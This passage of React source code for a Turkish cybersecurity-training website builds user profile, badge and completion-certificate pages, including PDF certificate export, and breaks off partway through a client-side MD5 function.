            <p className="text-[#00ff88]">$ cd ~ <span className="term-cursor"></span></p>
          </div>
        </div>
        <div className="flex gap-3 justify-center mt-7 flex-wrap">
          <button onClick={() => navigate('home')} className="font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-6 py-3.5 clip-btn hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all">Anasayfaya Dön →</button>
          <button onClick={() => navigate('pricing')} className="font-mono text-sm text-[#cdeede] px-6 py-3.5 border border-[#103a26] hover:border-[#00ff88] hover:text-[#00ff88] transition-colors">Eğitim Programı</button>
        </div>
      </div>
    </section>
    <Footer navigate={navigate} />
  </>
);

/* ============ PROFİL (herkese açık) ============ */
const ProfilePage = ({ navigate, data }) => {
  const [user] = useUser();
  const own = !data || (data.name === user.name);
  const u = own ? {
    name: user.name,
    pts: user.points,
    r: user.rank,
    lvl: user.level,
    solved: user.solved,
    badges: user.badges,
    streak: user.streak
  } : data;
  const initials = u.name.split(' ').map(s => s[0]).join('').slice(0, 2).toUpperCase();
  const solvedList = own 
    ? JSON.parse(localStorage.getItem('sk_solved_rooms') || '[]') 
    : (window.SK_ALL_ROOMS.slice(0, Math.min(window.SK_ALL_ROOMS.length, u.solved || 0)).map(r => r.id));
  const solved = solvedList.map(id => {
    const room = window.SK_ALL_ROOMS.find(r => r.id === id);
    return room ? { n: room.name, cat: room.cat, pts: room.points, d: room.difficulty } : null;
  }).filter(Boolean);
  const badgeUser = own 
    ? { points: user.points, level: user.level, rank: user.rank, streak: user.streak } 
    : { points: u.pts || 0, level: u.lvl || 1, rank: u.r || 1000, streak: u.streak || 0 };
  const dynamicBadges = window.getDynamicBadges ? window.getDynamicBadges(badgeUser, solvedList) : [];
  let badges = dynamicBadges.filter(b => b.done).map(b => b.icon);
  
  if (!own) {
    const targetCount = u.badges || 0;
    if (badges.length > targetCount) {
      badges = badges.slice(0, targetCount);
    } else if (badges.length < targetCount) {
      const remainingIcons = dynamicBadges
        .filter(b => !badges.includes(b.icon))
        .map(b => b.icon);
      const needed = targetCount - badges.length;
      badges = [...badges, ...remainingIcons.slice(0, needed)];
    }
  }

  return (
    <>
      <AppHeader navigate={navigate} active="" />
      <main className="max-w-[1080px] mx-auto px-6 py-10">
        <button onClick={() => navigate('leaderboard')} className="text-sm text-[#74998a] hover:text-[#00ff88] transition-colors mb-6">← Leaderboard'a dön</button>
        {/* hero card */}
        <div className="rounded-2xl border border-[#103a26] p-8 mb-8 flex flex-col sm:flex-row items-center sm:items-start gap-6" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
          <div className="w-24 h-24 flex-none rounded-2xl grid place-items-center text-[#5cffba] font-bold text-3xl border border-[#103a26]" style={{ background: 'linear-gradient(135deg,#0a3a24,#052b18)' }}>{initials}</div>
          <div className="flex-1 text-center sm:text-left">
            <div className="flex items-center justify-center sm:justify-start gap-3 flex-wrap">
              <h1 className="text-3xl text-[#eafff5] whitespace-nowrap" style={{ lineHeight: 1.2 }}>{u.name}</h1>
              {own && <span className="font-mono text-[10px] text-[#00ff88] border border-[#103a26] px-2 py-1 rounded-full bg-[rgba(0,255,136,.04)]">Bu sensin</span>}
            </div>
            <p className="text-sm text-[#74998a] mt-1.5 font-mono">@{u.name.toLowerCase().replace(/\s+/g, '')} · {u.lvl ? 'Level ' + u.lvl : 'Güvenlik Uzmanı'}</p>
            <div className="flex items-center justify-center sm:justify-start gap-6 mt-5">
              {[['Sıra', '#' + u.r], ['Puan', (u.pts || 0).toLocaleString('tr-TR')], ['Rozet', badges.length], ['Çözülen', solved.length]].map(([l, v], i) => (
                <div key={i} className="text-center"><div className="font-disp font-bold text-2xl text-[#00ff88]">{v}</div><div className="text-[11px] text-[#74998a] tracking-wide">{l}</div></div>
              ))}
            </div>
          </div>
          {own && <button onClick={() => navigate('dashboard')} className="font-mono text-sm text-[#cdeede] border border-[#103a26] px-5 py-2.5 rounded-lg hover:border-[#00ff88] hover:text-[#00ff88] transition-colors self-center">Dashboard</button>}
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-[1.4fr_1fr] gap-6">
          {/* solved */}
          <div className="rounded-2xl border border-[#0c2719] p-7" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
            <h2 className="text-lg text-[#eafff5] mb-5">Çözülen Görevler</h2>
            <div className="space-y-2.5">
              {solved.map((s, i) => (
                <div key={i} className="flex items-center justify-between p-3.5 rounded-lg bg-[#04100a] border border-[#0c2719]">
                  <div className="flex items-center gap-3"><span className="text-[#00ff88]">✓</span><div><div className="text-sm text-[#eafff5]">{s.n}</div><div className="text-xs text-[#74998a]">{s.cat} · {s.d}</div></div></div>
                  <span className="font-mono text-sm text-[#00ff88]">◆ {s.pts}</span>
                </div>
              ))}
            </div>
          </div>
          {/* badges */}
          <div className="rounded-2xl border border-[#0c2719] p-7" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
            <div className="flex items-center justify-between mb-5"><h2 className="text-lg text-[#eafff5]">Rozetler</h2>{own && <button onClick={() => navigate('badges')} className="text-xs text-[#00ff88] hover:text-[#5cffba]">Tümü →</button>}</div>
            <div className="grid grid-cols-4 gap-3">
              {badges.map((b, i) => (<span key={i} className="aspect-square rounded-lg grid place-items-center text-2xl border border-[#103a26] bg-[rgba(0,255,136,.03)]">{b}</span>))}
              {Array.from({ length: 3 }).map((_, i) => (<span key={i} className="aspect-square rounded-lg grid place-items-center text-2xl border border-[#0c2719] text-[#5c8a74]">?</span>))}
            </div>
          </div>
        </div>
      </main>
      <Footer navigate={navigate} />
    </>
  );
};

/* ============ ROZETLERİM ============ */
const BadgesPage = ({ navigate }) => {
  const [user] = useUser();
  const solvedList = JSON.parse(localStorage.getItem('sk_solved_rooms') || '[]');
  const all = window.getDynamicBadges ? window.getDynamicBadges(user, solvedList) : [];
  const earned = all.filter(b => b.done).length;
  return (
    <>
      <AppHeader navigate={navigate} active="" />
      <main className="max-w-[1080px] mx-auto px-6 py-10">
        <button onClick={() => navigate('dashboard')} className="text-sm text-[#74998a] hover:text-[#00ff88] transition-colors mb-6">← Dashboard'a dön</button>
        <div className="flex items-end justify-between flex-wrap gap-4 mb-8">
          <div><SectionLabel>Başarımlar</SectionLabel><h1 className="text-[clamp(28px,4vw,42px)] text-[#eafff5]">Rozetlerim</h1></div>
          <div className="text-right"><div className="font-disp font-bold text-3xl text-[#00ff88]">{earned}<span className="text-[#5c8a74] text-2xl">/{all.length}</span></div><div className="text-xs text-[#74998a]">rozet kazanıldı</div></div>
        </div>
        <div className="h-2 rounded-full bg-[#0c2719] overflow-hidden mb-10"><div className="h-full rounded-full bg-gradient-to-r from-[#00d978] to-[#00ff88] shadow-[0_0_12px_var(--glow)]" style={{ width: (earned / all.length * 100) + '%' }}></div></div>
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
          {all.map((b, i) => (
            <div key={i} className={"rounded-2xl border p-6 text-center transition-all " + (b.done ? 'border-[#103a26] hover:border-[#00ff88] hover:-translate-y-1' : 'border-[#0c2719] opacity-70')} style={{ background: b.done ? 'linear-gradient(165deg,#07150e,#04100a)' : '#050f0a' }}>
              <div className="text-4xl mb-3" style={{ filter: b.done ? 'none' : 'grayscale(1)' }}>{b.icon}</div>
              <h3 className={"text-sm mb-1.5 " + (b.done ? 'text-[#eafff5]' : 'text-[#74998a]')}>{b.name}</h3>
              <p className="text-xs text-[#74998a] leading-relaxed mb-3">{b.desc}</p>
              {b.done ? <span className="font-mono text-xs text-[#00ff88]">✓ Kazanıldı</span> : <span className="font-mono text-xs text-[#ffd166]">⏳ {b.prog}</span>}
            </div>
          ))}
        </div>
      </main>
      <Footer navigate={navigate} />
    </>
  );
};

const wrapText = (text, maxChars) => {
  if (!text) return [];
  const words = text.split(' ');
  const lines = [];
  let currentLine = '';
  words.forEach(word => {
    if ((currentLine + ' ' + word).trim().length <= maxChars) {
      currentLine = (currentLine + ' ' + word).trim();
    } else {
      lines.push(currentLine);
      currentLine = word;
    }
  });
  if (currentLine) lines.push(currentLine);
  return lines;
};

/* ============ SERTİFİKALARIM ============ */
const CertificatesPage = ({ navigate }) => {
  const [user, updateUser] = useUser();
  const [preview, setPreview] = useState(null);
  const [newName, setNewName] = useState(user.name);
  const [nameSuccess, setNameSuccess] = useState('');

  const saveName = () => {
    if (!newName.trim()) return;
    updateUser({ name: newName.trim(), nameChanged: true });
    setNameSuccess('İsminiz sertifikalar için başarıyla kilitlendi!');
    setTimeout(() => setNameSuccess(''), 3000);
  };

  const solvedList = JSON.parse(localStorage.getItem('sk_solved_rooms') || '[]');
  const webSolvedCount = solvedList.filter(id => id.startsWith('web-')).length;
  const sysSolvedCount = solvedList.filter(id => id.startsWith('sys-')).length;
  const netSolvedCount = solvedList.filter(id => id.startsWith('net-')).length;
  const totalSolved = solvedList.length;

  const lessonsProgress = (() => {
    try {
      const saved = localStorage.getItem('sk_lessons_progress');
      return saved ? JSON.parse(saved) : { 'ag-guvenligi': 0, 'uyg-guvenligi': 0 };
    } catch (e) {
      return { 'ag-guvenligi': 0, 'uyg-guvenligi': 0 };
    }
  })();

  const agProgress = lessonsProgress['ag-guvenligi'] || 0;
  const uygProgress = lessonsProgress['uyg-guvenligi'] || 0;

  const certs = [
    {
      title: 'Ağ Güvenliği Uzmanlığı',
      code: agProgress >= 30 ? `SK-NET-2026-${(user.name || '').slice(0,3).toUpperCase()}-${1000 + (user.points || 0)}` : null,
      date: agProgress >= 30 ? '30 Haz 2026' : null,
      done: agProgress >= 30,
      tasksDone: Math.min(agProgress, 30),
      tasksRequired: 30,
      prog: Math.min(100, Math.round((agProgress / 30) * 100)),
      desc: 'Bu sertifika sahibi, Siber Kampüs Akademi bünyesindeki 30 derslik Ağ Güvenliği eğitimini ve tüm değerlendirme testlerini başarıyla tamamlamıştır. Eğitim sürecinde TCP/IP ve OSI modelleri, ağ tarama ve keşif metodolojileri, Wireshark ile paket analizi, ARP zehirlenmesi, DHCP starvation ve kablosuz ağ güvenliği konularında üstün başarı göstererek uzmanlık yetkinliği kazanmıştır.'
    },
    {
      title: 'Uygulama Güvenliği Uzmanlığı',
      code: uygProgress >= 30 ? `SK-APP-2026-${(user.name || '').slice(0,3).toUpperCase()}-${1000 + (user.points || 0)}` : null,
      date: uygProgress >= 30 ? '30 Haz 2026' : null,
      done: uygProgress >= 30,
      tasksDone: Math.min(uygProgress, 30),
      tasksRequired: 30,
      prog: Math.min(100, Math.round((uygProgress / 30) * 100)),
      desc: 'Bu sertifika sahibi, Siber Kampüs Akademi bünyesindeki 30 derslik Uygulama Güvenliği eğitimini ve tüm değerlendirme testlerini başarıyla tamamlamıştır. Eğitim sürecinde OWASP Top 10 standartları, SQL Injection (SQLi), Cross-Site Scripting (XSS), CSRF, LFI/RFI, XXE, SSRF, JWT manipülasyonu, CORS zafiyetleri, güvenli kod analizi (SAST/DAST) ve DevSecOps prensipleri konularında üstün başarı göstererek uzmanlık yetkinliği kazanmıştır.'
    }
  ];

  const CertVisual = ({ cert, forDownload }) => {
    const w = forDownload ? 1200 : 600;
    const h = forDownload ? 850 : 425;
    const s = forDownload ? 2 : 1;
    return (
      <svg xmlns="http://www.w3.org/2000/svg" viewBox={`0 0 ${w} ${h}`} width={w} height={h} style={{ maxWidth: '100%', height: 'auto' }}>
        <defs>
          <linearGradient id="certBg" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stopColor="#08120d" /><stop offset="100%" stopColor="#04100a" /></linearGradient>
          <linearGradient id="certGlow" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#00ff88" stopOpacity="0.15" /><stop offset="100%" stopColor="#00ff88" stopOpacity="0" /></linearGradient>
          <linearGradient id="certLine" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stopColor="transparent" /><stop offset="50%" stopColor="#00ff88" /><stop offset="100%" stopColor="transparent" /></linearGradient>
        </defs>
        <rect width={w} height={h} rx={16*s} fill="url(#certBg)" />
        <rect x={2*s} y={2*s} width={w-4*s} height={h-4*s} rx={14*s} fill="none" stroke="#103a26" strokeWidth={1.5*s} />
        {Array.from({length:Math.floor(w/40)}).map((_,i)=><line key={'v'+i} x1={i*40*s} y1={0} x2={i*40*s} y2={h} stroke="rgba(0,255,136,0.04)" strokeWidth={s}/>)}
        {Array.from({length:Math.floor(h/40)}).map((_,i)=><line key={'h'+i} x1={0} y1={i*40*s} x2={w} y2={i*40*s} stroke="rgba(0,255,136,0.04)" strokeWidth={s}/>)}
        <rect x={0} y={0} width={w} height={h*0.35} rx={16*s} fill="url(#certGlow)" />
        <path d={`M${24*s},${8*s} L${8*s},${8*s} L${8*s},${24*s}`} fill="none" stroke="#00ff88" strokeWidth={2*s} strokeLinecap="round" />
        <path d={`M${w-24*s},${8*s} L${w-8*s},${8*s} L${w-8*s},${24*s}`} fill="none" stroke="#00ff88" strokeWidth={2*s} strokeLinecap="round" />
        <path d={`M${24*s},${h-8*s} L${8*s},${h-8*s} L${8*s},${h-24*s}`} fill="none" stroke="#00ff88" strokeWidth={2*s} strokeLinecap="round" />
        <path d={`M${w-24*s},${h-8*s} L${w-8*s},${h-8*s} L${w-8*s},${h-24*s}`} fill="none" stroke="#00ff88" strokeWidth={2*s} strokeLinecap="round" />
        <rect x={w/2-17*s} y={25*s} width={34*s} height={34*s} rx={8*s} fill="none" stroke="#00ff88" strokeWidth={1.5*s} />
        <text x={w/2} y={25*s+23*s} textAnchor="middle" fill="#00ff88" fontFamily="JetBrains Mono, monospace" fontSize={14*s} fontWeight="bold">&gt;_</text>
        <text x={w/2} y={25*s+50*s} textAnchor="middle" fill="#eafff5" fontFamily="Chakra Petch, sans-serif" fontSize={14*s} fontWeight="bold">siber<tspan fill="#00ff88">kampus</tspan></text>
        <text x={w/2} y={25*s+72*s} textAnchor="middle" fill="#74998a" fontFamily="JetBrains Mono, monospace" fontSize={9*s} letterSpacing={4*s}>TAMAMLAMA SERTİFİKASI</text>
        <rect x={w*0.15} y={25*s+84*s} width={w*0.7} height={1.5*s} fill="url(#certLine)" />
        <text x={w/2} y={25*s+110*s} textAnchor="middle" fill="#00ff88" fontFamily="Chakra Petch, sans-serif" fontSize={22*s} fontWeight="bold" style={{filter:'drop-shadow(0 0 12px rgba(0,255,136,0.4))'}}>{cert.title}</text>
        <text x={w/2} y={25*s+138*s} textAnchor="middle" fill="#74998a" fontFamily="JetBrains Mono, monospace" fontSize={9*s}>başarıyla tamamlayan</text>
        <text x={w/2} y={25*s+172*s} textAnchor="middle" fill="#eafff5" fontFamily="Chakra Petch, sans-serif" fontSize={28*s} fontWeight="bold">{user.name}</text>
        <rect x={w*0.25} y={25*s+188*s} width={w*0.5} height={1*s} fill="url(#certLine)" />
        {cert.desc && (
          <g>
            {wrapText(cert.desc, 76).map((line, idx) => (
              <text key={idx} x={w/2} y={25*s+210*s + idx*12*s} textAnchor="middle" fill="#74998a" fontFamily="JetBrains Mono, monospace" fontSize={7.5*s}>{line}</text>
            ))}
          </g>
        )}
        <rect x={w*0.25} y={25*s+280*s} width={w*0.5} height={1*s} fill="url(#certLine)" />
        <text x={w*0.25} y={25*s+308*s} fill="#74998a" fontFamily="JetBrains Mono, monospace" fontSize={9*s}>Tarih: <tspan fill="#5cffba">{cert.date}</tspan></text>
        <text x={w*0.75} y={25*s+308*s} textAnchor="end" fill="#74998a" fontFamily="JetBrains Mono, monospace" fontSize={9*s}>Görevler: <tspan fill="#5cffba">{cert.tasksDone}/{cert.tasksRequired}</tspan></text>
        <text x={w/2} y={25*s+328*s} textAnchor="middle" fill="#74998a" fontFamily="JetBrains Mono, monospace" fontSize={9*s}>Doğrulama Kodu: <tspan fill="#00ff88">{cert.code}</tspan></text>
        <text x={w/2} y={h-28*s} textAnchor="middle" fill="#00ff88" fontFamily="sans-serif" fontSize={20*s}>🎖️</text>
      </svg>
    );
  };

  const downloadCert = (cert) => {
    document.fonts.ready.then(() => {
      const scale = 4.0;
      const svgW = 1200 * scale, svgH = 850 * scale;
      const canvas = document.createElement('canvas');
      canvas.width = svgW;
      canvas.height = svgH;
      const ctx = canvas.getContext('2d');
      
      const bgGrad = ctx.createLinearGradient(0, 0, svgW, svgH);
      bgGrad.addColorStop(0, '#08120d');
      bgGrad.addColorStop(1, '#04100a');
      ctx.fillStyle = bgGrad;
      ctx.beginPath();
      ctx.roundRect(0, 0, svgW, svgH, 32 * scale);
      ctx.fill();
      
      ctx.strokeStyle = '#103a26';
      ctx.lineWidth = 3 * scale;
      ctx.beginPath();
      ctx.roundRect(4 * scale, 4 * scale, svgW - 8 * scale, svgH - 8 * scale, 28 * scale);
      ctx.stroke();
      
      ctx.strokeStyle = 'rgba(0,255,136,0.04)';
      ctx.lineWidth = 2 * scale;
      for (let i = 0; i < svgW; i += 40 * scale) { ctx.beginPath(); ctx.moveTo(i, 0); ctx.lineTo(i, svgH); ctx.stroke(); }
      for (let i = 0; i < svgH; i += 40 * scale) { ctx.beginPath(); ctx.moveTo(0, i); ctx.lineTo(svgW, i); ctx.stroke(); }
      
      ctx.strokeStyle = '#00ff88';
      ctx.lineWidth = 4 * scale;
      ctx.lineCap = 'round';
      [
        [48 * scale, 16 * scale, 16 * scale, 16 * scale, 16 * scale, 48 * scale],
        [svgW - 48 * scale, 16 * scale, svgW - 16 * scale, 16 * scale, svgW - 16 * scale, 48 * scale],
        [48 * scale, svgH - 16 * scale, 16 * scale, svgH - 16 * scale, 16 * scale, svgH - 48 * scale],
        [svgW - 48 * scale, svgH - 16 * scale, svgW - 16 * scale, svgH - 16 * scale, svgW - 16 * scale, svgH - 48 * scale]
      ].forEach(([x1,y1,x2,y2,x3,y3]) => {
        ctx.beginPath(); ctx.moveTo(x1,y1); ctx.lineTo(x2,y2); ctx.lineTo(x3,y3); ctx.stroke();
      });
      
      ctx.strokeStyle = '#00ff88';
      ctx.lineWidth = 3 * scale;
      ctx.beginPath();
      ctx.roundRect(svgW/2 - 34 * scale, 50 * scale, 68 * scale, 68 * scale, 16 * scale);
      ctx.stroke();
      
      ctx.fillStyle = '#00ff88';
      ctx.font = `bold ${28 * scale}px "JetBrains Mono", monospace`;
      ctx.textAlign = 'center';
      ctx.fillText('>_', svgW/2, 96 * scale);
      
      ctx.font = `bold ${28 * scale}px "Chakra Petch", sans-serif`;
      ctx.fillStyle = '#eafff5';
      ctx.textAlign = 'right';
      ctx.fillText('siber', svgW/2 - 2 * scale, 150 * scale);
      ctx.fillStyle = '#00ff88';
      ctx.textAlign = 'left';
      ctx.fillText('kampus', svgW/2 + 2 * scale, 150 * scale);
      
      ctx.font = `${18 * scale}px "JetBrains Mono", monospace`;
      ctx.fillStyle = '#74998a';
      ctx.textAlign = 'center';
      ctx.fillText('TAMAMLAMA SERTİFİKASI', svgW/2, 186 * scale);
      
      const lineGrad = ctx.createLinearGradient(svgW*0.2, 0, svgW*0.8, 0);
      lineGrad.addColorStop(0, 'transparent');
      lineGrad.addColorStop(0.5, '#00ff88');
      lineGrad.addColorStop(1, 'transparent');
      ctx.fillStyle = lineGrad;
      ctx.fillRect(svgW*0.2, 202 * scale, svgW*0.6, 2 * scale);
      
      ctx.font = `bold ${44 * scale}px "Chakra Petch", sans-serif`;
      ctx.fillStyle = '#00ff88';
      ctx.shadowColor = 'rgba(0,255,136,0.4)';
      ctx.shadowBlur = 24 * scale;
      ctx.fillText(cert.title, svgW/2, 256 * scale);
      ctx.shadowBlur = 0;
      
      ctx.font = `${20 * scale}px "JetBrains Mono", monospace`;
      ctx.fillStyle = '#74998a';
      ctx.fillText('başarıyla tamamlayan', svgW/2, 310 * scale);
      
      ctx.font = `bold ${56 * scale}px "Chakra Petch", sans-serif`;
      ctx.fillStyle = '#eafff5';
      ctx.fillText(user.name, svgW/2, 376 * scale);
      
      ctx.fillStyle = lineGrad;
      ctx.fillRect(svgW*0.25, 410 * scale, svgW*0.5, 1 * scale);
      
      ctx.font = `${15 * scale}px "JetBrains Mono", monospace`;
      ctx.fillStyle = '#74998a';
      const descLines = wrapText(cert.desc, 80);
      descLines.forEach((line, idx) => {
        ctx.fillText(line, svgW/2, (450 + idx * 24) * scale);
      });
      
      ctx.fillStyle = lineGrad;
      ctx.fillRect(svgW*0.25, 590 * scale, svgW*0.5, 1 * scale);
      
      ctx.font = `${18 * scale}px "JetBrains Mono", monospace`;
      
      ctx.textAlign = 'left';
      ctx.fillStyle = '#74998a';
      ctx.fillText('Tarih: ', svgW*0.2, 640 * scale);
      const dateLabelWidth = ctx.measureText('Tarih: ').width;
      ctx.fillStyle = '#5cffba';
      ctx.fillText(cert.date, svgW*0.2 + dateLabelWidth, 640 * scale);
      
      ctx.textAlign = 'right';
      ctx.fillStyle = '#5cffba';
      ctx.fillText(cert.tasksDone + '/' + cert.tasksRequired, svgW*0.8, 640 * scale);
      const tasksValWidth = ctx.measureText(cert.tasksDone + '/' + cert.tasksRequired).width;
      ctx.fillStyle = '#74998a';
      ctx.fillText('Görevler: ', svgW*0.8 - tasksValWidth - 5 * scale, 640 * scale);
      
      ctx.textAlign = 'right';
      ctx.fillStyle = '#74998a';
      ctx.fillText('Doğrulama Kodu: ', svgW/2, 680 * scale);
      ctx.textAlign = 'left';
      ctx.fillStyle = '#00ff88';
      ctx.fillText(cert.code, svgW/2 + 5 * scale, 680 * scale);
      
      ctx.textAlign = 'center';
      ctx.font = `${40 * scale}px sans-serif`;
      ctx.fillText('🎖️', svgW/2, svgH - 56 * scale);
      
      const imgData = canvas.toDataURL('image/png', 1.0);
      
      const savePDF = () => {
        const { jsPDF } = window.jspdf;
        const pdf = new jsPDF({ orientation: 'landscape', unit: 'px', format: [1200, 850] });
        pdf.addImage(imgData, 'PNG', 0, 0, 1200, 850);
        pdf.save('siberkampus-sertifika-' + cert.code + '.pdf');
      };

      if (window.jspdf) {
        savePDF();
      } else {
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js';
        script.onload = () => savePDF();
        document.head.appendChild(script);
      }
    });
  };

  return (
    <>
      <AppHeader navigate={navigate} active="" />
      <main className="max-w-[1080px] mx-auto px-6 py-10">
        <button onClick={() => navigate('dashboard')} className="text-sm text-[#74998a] hover:text-[#00ff88] transition-colors mb-6">← Dashboard'a dön</button>
        <div className="mb-8"><SectionLabel>Doğrulanabilir</SectionLabel><h1 className="text-[clamp(28px,4vw,42px)] text-[#eafff5]">Sertifikalarım</h1><p className="text-[#74998a] mt-2">Tamamladığın yollar için kazandığın sertifikalar. Her biri doğrulanabilir bir koda sahiptir.</p></div>



        <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
          {certs.map((c, i) => (
            <div key={i} className={"rounded-2xl border overflow-hidden " + (c.done ? 'border-[#103a26] hover:border-[#00ff88] transition-all' : 'border-[#0c2719]')}>
              <div className="relative p-5 border-b border-[#0c2719] cursor-pointer" style={{ background: c.done ? 'linear-gradient(135deg,#08120d,#04100a)' : '#050f0a' }} onClick={() => c.done && setPreview(c)}>
                {c.done ? <CertVisual cert={c} /> : (
                  <div className="relative p-4">
                     <div className="absolute inset-0 opacity-[.06] pointer-events-none" style={{ backgroundImage: 'linear-gradient(rgba(0,255,136,.5) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.5) 1px,transparent 1px)', backgroundSize: '20px 20px' }}></div>
                     <div className="relative flex items-start justify-between">
                       <div>
                         <div className="flex items-center gap-2 mb-3"><span className="w-7 h-7 border border-[#00ff88] rounded grid place-items-center text-[#00ff88] font-mono text-[11px] font-bold">&gt;_</span><span className="font-disp font-bold text-sm text-[#eafff5]">siberkampus</span></div>
                         <p className="font-mono text-[10px] text-[#74998a] tracking-widest uppercase">Tamamlama Sertifikası</p>
                         <h3 className="font-disp font-bold text-xl mt-2 text-[#74998a]" style={{ maxWidth: '260px', lineHeight: 1.25 }}>{c.title}</h3>
                       </div>
                       <span className="text-3xl" style={{ filter: 'grayscale(1) opacity(.5)' }}>🔒</span>
                     </div>
                  </div>
                )}
              </div>
              <div className="p-5 flex items-center justify-between gap-3" style={{ background: 'linear-gradient(165deg,#07150e,#04100a)' }}>
                {c.done ? (
                  <>
                    <span className="font-mono text-xs text-[#74998a]">Kod: <span className="text-[#5cffba]">{c.code}</span></span>
                    <div className="flex gap-2">
                      <button onClick={() => downloadCert(c)} className="text-xs font-bold text-[#021008] bg-[#00ff88] px-4 py-2 rounded-lg hover:shadow-[0_0_20px_-4px_var(--glow)] transition-all">⤓ PDF İndir</button>
                      <button onClick={() => setPreview(c)} className="text-xs text-[#cdeede] border border-[#103a26] px-4 py-2 rounded-lg hover:border-[#00ff88] hover:text-[#00ff88] transition-colors">Görüntüle</button>
                    </div>
                  </>
                ) : (
                  <div className="w-full">
                    <div className="flex justify-between text-xs text-[#74998a] mb-2"><span>Tamamlanan: {c.tasksDone}/{c.tasksRequired} görev</span><span className="text-[#ffd166]">{c.prog}%</span></div>
                    <div className="h-2 rounded-full bg-[#0c2719] overflow-hidden"><div className="h-full rounded-full bg-gradient-to-r from-[#00d978] to-[#00ff88]" style={{ width: c.prog + '%' }}></div></div>
                  </div>
                )}
              </div>
            </div>
          ))}
        </div>

        {preview && (
          <div className="fixed inset-0 bg-black/75 backdrop-blur-sm grid place-items-center z-[80] p-6" onClick={() => setPreview(null)}>
            <div className="max-w-[720px] w-full" onClick={e => e.stopPropagation()}>
              <CertVisual cert={preview} />
              <div className="flex justify-center gap-3 mt-5">
                <button onClick={() => downloadCert(preview)} className="font-mono text-sm font-bold text-[#021008] bg-[#00ff88] px-6 py-3 rounded-lg hover:shadow-[0_0_28px_-4px_var(--glow)] transition-all">⤓ PDF İndir</button>
                <button onClick={() => setPreview(null)} className="font-mono text-sm text-[#cdeede] border border-[#103a26] px-6 py-3 rounded-lg hover:border-[#00ff88] hover:text-[#00ff88] transition-colors">Kapat</button>
              </div>
            </div>
          </div>
        )}


      </main>
      <Footer navigate={navigate} />
    </>
  );
};

/* ============ SİBER GÜVENLİK ARAÇLARI UTILS ============ */

// 1. MD5 implementation (100% Client-Side JS)
function md5(string) {
  function RotateLeft(lValue, iShiftBits) {
    return (lValue<<iShiftBits) | (lValue>>>(32-iShiftBits));
  }
  function AddUnsigned(lX,lY) {
    var lX8,lY8,lX4,lY4,lResult;
    lX8 = (lX & 0x80000000);
    lY8 = (lY & 0x80000000);
    lX4 = (lX & 0x40000000);
    lY4 = (lY & 0x40000000);
    lResult = (lX & 0x3FFFFFFF)+(lY & 0x3FFFFFFF);
    if (lX4 & lY4) {
      return (lResult ^ 0x80000000 ^ lX8 ^ lY8);
    }
    if (lX4 | lY4) {
      if (lResult & 0x40000000) {
        return (lResult ^ 0xC0000000 ^ lX8 ^ lY8);
      } else {
        return (lResult ^ 0x40000000 ^ lX8 ^ lY8);
      }
    } else {
      return (lResult ^ lX8 ^ lY8);
    }
  }
  function F(x,y,z) { return (x & y) | ((~x) & z); }
  function G(x,y,z) { return (x & z) | (y & (~z)); }
  function H(x,y,z) { return (x ^ y ^ z); }
  function I(x,y,z) { return (y ^ (x | (~z))); }
  function FF(a,b,c,d,x,s,ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(F(b,c,d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  };
  function GG(a,b,c,d,x,s,ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(G(b,c,d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  };
  function HH(a,b,c,d,x,s,ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(H(b,c,d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  };
  function II(a,b,c,d,x,s,ac) {
    a = AddUnsigned(a, AddUnsigned(AddUnsigned(I(b,c,d), x), ac));
    return AddUnsigned(RotateLeft(a, s), b);
  };
  function ConvertToWordArray(string) {
    var lWordCount;
    var lMessageLength = string.length;
    var lNumberOfWords_temp1=lMessageLength + 8;
    var lNumberOfWords_temp2=(lNumberOfWords_temp1-(lNumberOfWords_temp1 % 64))/64;
    var lNumberOfWords = (lNumberOfWords_temp2+1)*16;
    var lWordArray=Array(lNumberOfWords);
    var lBytePosition = 0;
    var lByteCount = 0;
    while ( lByteCount < lMessageLength ) {
      lWordCount = (lByteCount-(lByteCount % 4))/4;
      lBytePosition = (lByteCount % 4)*8;
      lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount)<<lBytePosition));
      lByteCount++;
    }
    lWordCount = (lByteCount-(lByteCount % 4))/4;
    lBytePosition = (lByteCount % 4)*8;
    lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80<<lBytePosition);
    lWordArray[lNumberOfWords-2] = lMessageLength<<3;
    lWordArray[lNumberOfWords-1] = lMessageLength>>>29;
    return lWordArray;
  };
  function WordToHex(lValue) {
    var WordToHexValue="",WordToHexValue_temp="",lByte,lCount;
    for (lCount = 0;lCount<=3;lCount++) {
      lByte = (lValue>>>(lCount*8)) & 255;
      WordToHexValue_temp = "0" + lByte.toString(16);
      WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length-2,2);
    }
    return WordToHexValue;
  };
  function Utf8Encode(string) {
    string = string.replace(/\r\n/g,"\n");
    var utftext = "";
    for (var n = 0; n < string.length; n++) {
      var c = string.charCodeAt(n);
      if (c < 128) {
        utftext += String.fromCharCode(c);
      } else if((c > 127) && (c < 2048)) {
        utftext += String.fromCharCode((c >> 6) | 192);
        utftext += String.fromCharCode((c & 63) | 128);
      } else {
        utftext += String.fromCharCode((c >> 12) | 224);
        utftext += String.fromCharCode(((c >> 6) & 63) | 128);
        utftext += String.fromCharCode((c & 63) | 128);
      }
    }
    return utftext;
  };
  var x=Array();
  var k,AA,BB,CC,DD,a,b,c,d;
